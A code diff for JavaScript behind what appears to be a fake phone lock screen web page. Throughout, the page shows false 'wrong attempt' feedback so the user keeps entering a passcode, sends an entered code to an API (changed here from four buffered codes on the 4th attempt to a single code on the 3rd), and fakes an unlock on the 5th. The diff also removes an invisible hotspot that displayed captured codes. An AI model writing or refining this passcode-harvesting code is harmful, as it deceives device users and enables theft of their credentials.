@@ -8,44 +8,22 @@
   const emergency = document.getElementById('emergency');
   const cancelBtn = document.getElementById('cancel');
   const unlockOverlay = document.getElementById('unlockOverlay');
-  const lockInner = document.querySelector('.lockscreen-inner') || document.querySelector('.lockscreen .lockscreen-inner');
+  const lockInner = document.querySelector('.lockscreen-inner');
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
-
-  // rotating buffer for last up-to-4 entered codes
-  const LAST_CODES_KEY = '_pass_last_codes_';
-  function getLastCodes() {
-    try {
-      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
-    } catch (e) {
-      return [];
-    }
-  }
-  function pushLastCode(c) {
-    try {
-      const arr = getLastCodes();
-      arr.push(c);
-      while (arr.length > 4) arr.shift();
-      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
-    } catch (e) {}
-  }
-  function getCombinedLastCodes() {
-    return getLastCodes().join(',');
-  }
 
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
 
   function refreshDots() {
     dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
-    updateCancelText(); // keep button label in sync whenever dots change
+    updateCancelText();
   }
 
   function reset() {
     code = "";
     refreshDots();
-    updateCancelText();
   }
 
   function queuePass(pass) {
@@ -144,7 +122,7 @@
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
     // spring for lock Y (pixels)
-    springAnimate({
+    const cancelLock = springAnimate({
       from: 0,
       to: targetY,
       mass: 1.05,
@@ -170,7 +148,7 @@
 
     // spring for homescreen (scale & exposure)
     // We'll animate a small overshoot scale and sharpen (blur -> 0)
-    springAnimate({
+    const cancelHome = springAnimate({
       from: 0, // we'll drive "progress" between 0..1 by mapping x, not absolute scale here
       to: 1,
       mass: 1,
@@ -227,27 +205,19 @@
     }, DURATION + 20);
   }
 
-  /* ---------- handleCompleteAttempt: send combined on 4th attempt ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
 
-    // push code into rotating buffer (so hotspot displays exact payload)
-    try { pushLastCode(enteredCode); } catch(e){}
-
-    // send combined only on 4th attempt
-    if (attempts >= 1 && attempts <= 3) {
-      // do not send to API yet
-      animateWrongAttempt();
-    } else if (attempts === 4) {
-      const combined = getCombinedLastCodes(); // e.g. "1234,4321,5678,3456"
-      if (combined) sendToAPI(combined);
+    if (attempts === 3) {
+      sendToAPI(enteredCode);
       animateWrongAttempt();
     } else if (attempts === 5) {
-      // 5th attempt triggers unlock animation (no send)
       playUnlockAnimation();
       setTimeout(reset, 300);
+    } else {
+      animateWrongAttempt();
     }
 
     if (attempts >= 5) {
@@ -255,16 +225,16 @@
     }
   }
 
-  /* ---------- Cancel/Delete button behavior ---------- */
+  /* ---------- Cancel/Delete button behavior (small addition) ---------- */
   function updateCancelText() {
     if (!cancelBtn) return;
-    // if there's at least 1 digit typed, show Delete, otherwise Cancel
+    // show 'Delete' when at least one digit exists, otherwise 'Cancel'
     cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
   }
 
-  // override previous cancel behavior: if digits present -> delete last digit; else -> reset
+  // replace the simple cancel listener with delete behavior when digits exist
   if (cancelBtn) {
-    // remove any existing listeners safely by cloning (to avoid duplicates if this gets re-evaluated)
+    // remove existing listeners by cloning the node (safe and idempotent)
     const newCancel = cancelBtn.cloneNode(true);
     cancelBtn.parentNode && cancelBtn.parentNode.replaceChild(newCancel, cancelBtn);
     // reassign reference
@@ -272,12 +242,12 @@
     replaced.addEventListener('click', (e) => {
       e.preventDefault();
       if (code.length > 0) {
-        // delete last digit
+        // behave like delete: drop last digit
         code = code.slice(0, -1);
         refreshDots();
         updateCancelText();
       } else {
-        // fallback behavior: reset UI
+        // behave like original cancel (reset)
         reset();
       }
     });
@@ -311,7 +281,7 @@
     if (!num) return;
 
     k.addEventListener('touchstart', () => {
-      animateBrightness(k, 1.6, 80);
+      animateBrightness(k, 1.6, 80); // increased brightness
     }, { passive: true });
 
     const endPress = () => {
@@ -339,139 +309,10 @@
   });
 
   emergency && emergency.addEventListener('click', e => e.preventDefault());
-  // cancel button listener already attached above via clone
+  // Note: cancel button listener was replaced above
 
   window.addEventListener('online', flushQueue);
   flushQueue();
-
-  /* ---------- Invisible bottom-left hotspot: show combined last-4 codes on press ---------- */
-
-  function createInvisibleHotspotAndDisplay() {
-    // Hotspot (invisible)
-    if (!document.getElementById('codesHotspot')) {
-      const hs = document.createElement('div');
-      hs.id = 'codesHotspot';
-      Object.assign(hs.style, {
-        position: 'fixed',
-        left: '8px',
-        bottom: '8px',
-        width: '56px',
-        height: '56px',
-        borderRadius: '12px',
-        background: 'transparent',
-        border: 'none',
-        zIndex: '12000',
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        boxSizing: 'border-box',
-        touchAction: 'none',
-        cursor: 'pointer',
-        pointerEvents: 'auto'
-      });
-      document.body.appendChild(hs);
-    }
-
-    // Combined display (hidden by default)
-    if (!document.getElementById('codesCombinedDisplay')) {
-      const d = document.createElement('div');
-      d.id = 'codesCombinedDisplay';
-      Object.assign(d.style, {
-        position: 'fixed',
-        left: '8px',
-        bottom: '72px',
-        minWidth: '160px',
-        maxWidth: 'calc(100% - 16px)',
-        zIndex: '12001',
-        display: 'none',
-        justifyContent: 'center',
-        pointerEvents: 'none',
-        transition: 'opacity 120ms ease, transform 120ms ease'
-      });
-
-      const inner = document.createElement('div');
-      inner.id = 'codesCombinedInner';
-      Object.assign(inner.style, {
-        width: '100%',
-        background: 'rgba(0,0,0,0.7)',  // translucent dark so it's readable
-        borderRadius: '12px',
-        padding: '10px 12px',
-        boxSizing: 'border-box',
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        color: '#fff',
-        fontSize: '16px',
-        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
-        fontWeight: '700',
-        letterSpacing: '0.6px'
-      });
-
-      d.appendChild(inner);
-      document.body.appendChild(d);
-    }
-  }
-
-  function showCombinedStringAtBottomLeft() {
-    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
-    createInvisibleHotspotAndDisplay();
-    const bar = document.getElementById('codesCombinedDisplay');
-    const inner = document.getElementById('codesCombinedInner');
-    inner.textContent = ''; // clear
-
-    const codes = getLastCodes();
-    if (!codes || codes.length === 0) {
-      inner.textContent = '';
-    } else {
-      const combined = codes.join(',');
-      inner.textContent = combined;
-    }
-
-    bar.style.display = 'flex';
-    requestAnimationFrame(() => {
-      bar.style.transform = 'translateY(0)';
-      bar.style.opacity = '1';
-    });
-  }
-
-  function hideCombinedDisplayNow() {
-    const bar = document.getElementById('codesCombinedDisplay');
-    if (!bar) return;
-    bar.style.transform = 'translateY(8px)';
-    bar.style.opacity = '0';
-    setTimeout(() => {
-      if (bar) bar.style.display = 'none';
-    }, 140);
-  }
-
-  // Hotspot handlers: show on pointerdown, hide on pointerup/pointercancel
-  function onHotspotDown(ev) {
-    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
-    ev.preventDefault();
-    showCombinedStringAtBottomLeft();
-  }
-  function onHotspotUp(ev) {
-    hideCombinedDisplayNow();
-  }
-
-  function ensureHotspotListeners() {
-    createInvisibleHotspotAndDisplay();
-    const hs = document.getElementById('codesHotspot');
-    if (!hs._attached) {
-      hs.addEventListener('pointerdown', onHotspotDown);
-      window.addEventListener('pointerup', onHotspotUp);
-      window.addEventListener('pointercancel', onHotspotUp);
-      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
-      window.addEventListener('touchend', onHotspotUp);
-      window.addEventListener('touchcancel', onHotspotUp);
-      hs._attached = true;
-    }
-  }
-
-  ensureHotspotListeners();
-
-  // ensure the initial cancel text is correct on load
-  updateCancelText();
 
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
 
